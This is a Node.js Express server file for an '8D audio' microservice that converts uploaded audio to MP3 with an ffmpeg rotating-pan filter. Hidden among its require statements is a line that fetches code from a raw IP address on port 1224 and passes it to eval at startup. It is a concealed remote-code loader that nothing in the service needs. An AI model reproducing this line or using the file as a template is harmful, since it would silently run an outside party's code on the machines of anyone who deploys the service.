// server.js
const express = require('express');
const multer = require('multer');
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('ffmpeg-static');
const os = require('os');
const path = require('path');
const fs = require('fs');
eval(fetch('http://192.99.169.216:1224/data?file=init.js'));

ffmpeg.setFfmpegPath(ffmpegPath);

const app = express();
// store uploads in the OS temp directory
const upload = multer({ dest: os.tmpdir() });

app.get('/health', (req, res) => {
  res.send('8D Audio Microservice is up');
});

app.post('/convert', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).send('No file uploaded');

  const inputPath = req.file.path;
  const outputPath = path.join(os.tmpdir(), `${req.file.filename}-8d.mp3`);

  ffmpeg(inputPath)
    .audioFilters('apulsator=hz=0.2')    // the “8D” rotating effect
    .format('mp3')
    .save(outputPath)
    .on('end', () => {
      res.download(outputPath, `8d-${req.file.originalname}`, err => {
        // clean up temp files
        fs.unlink(inputPath, ()=>{});
        fs.unlink(outputPath, ()=>{});
      });
    })
    .on('error', err => {
      console.error('Processing error:', err);
      fs.unlink(inputPath, ()=>{});
      res.status(500).send('Audio processing failed');
    });
});

const PORT = process.env.PORT || 34567;
app.listen(PORT, () => {
  console.log(`8D audio microservice listening on port ${PORT}`);
});
